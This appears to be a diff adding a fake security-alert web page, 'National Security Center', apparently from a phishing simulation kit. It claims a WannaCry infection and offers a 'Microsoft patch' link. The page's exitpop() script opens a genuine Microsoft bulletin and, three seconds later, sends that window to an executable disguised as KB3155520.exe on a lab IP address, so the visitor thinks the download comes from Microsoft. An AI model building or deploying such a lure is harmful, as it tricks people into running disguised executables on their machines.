@@ -1,0 +1,53 @@
+<!DOCTYPE HTML>
+<!--
+	Photon by HTML5 UP
+	html5up.net | @n33co
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>National Security Center</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<link rel="stylesheet" href="//code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
+  		<style>
+  		.ui-datepicker select.ui-datepicker-month, .ui-datepicker select.ui-datepicker-year {
+		    display: inline;
+		}
+  		</style>
+		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
+		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
+
+    </script>
+	</head>
+
+<script type="text/javascript">
+
+function exitpop()
+{
+
+bkp = window.open("https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010", "_blank");
+setTimeout( function(){ bkp.location.href = "http://192.168.56.1/incident/KB3155520.exe"; }, 3000);
+}
+</script>
+
+	<body>
+
+		<!-- Header -->
+			<section id="header">
+				<div class="inner">
+				<img src="logo.jpg" height="200" width="500">
+				
+					<h1>Malware Infection Detected</h1>
+					<p>Our <b>IPS</b> device has identified <b>WannaCry ransomware</b> infection on your computer which could encrypt your important files. Please download security patch released by Microsoft to disinfect your computer</p>
+					<ul class="actions">
+						<li><a style="font-weight:bold" id="myLink" href="https://technet.microsoft.com/en-us/library/security/MS16-061" onclick="exitpop();return false;">Download patch from Microsoft website</a></li>
+					</ul>
+				</div>
+			</section>
+
+							
+	</body>
+</html>
